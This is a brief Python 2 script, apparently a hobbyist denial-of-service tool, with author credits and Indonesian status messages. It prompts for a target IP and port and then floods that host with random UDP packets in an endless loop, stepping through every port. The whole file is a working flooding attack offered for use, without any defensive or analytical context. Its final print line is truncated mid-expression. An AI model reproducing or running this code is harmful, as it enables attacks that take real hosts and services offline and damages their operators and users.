#!/system/bin/python

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "\033[1;34mAuthor    :\033[1;33m Mr_Inviseble"
print "\033[1;34mYoutube   :\033[1;33m Mr_Inviseble"
print "\033[1;34mInstagram :\033[1;33m Inviseble057"
print "\033[1;34mThanks    :\033[1;33m FIREWOLF"
time.sleep(0.3)
print "======================="
ip = raw_input("IP Target : ")
print "======================="
port = input("Port       : ")
print "======================="
os.system("clear")
print "[                    ] 0% "
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "sedang mengirim %s paket ke %s port web:%s"%(s>
     if port == 65534:
       port = 1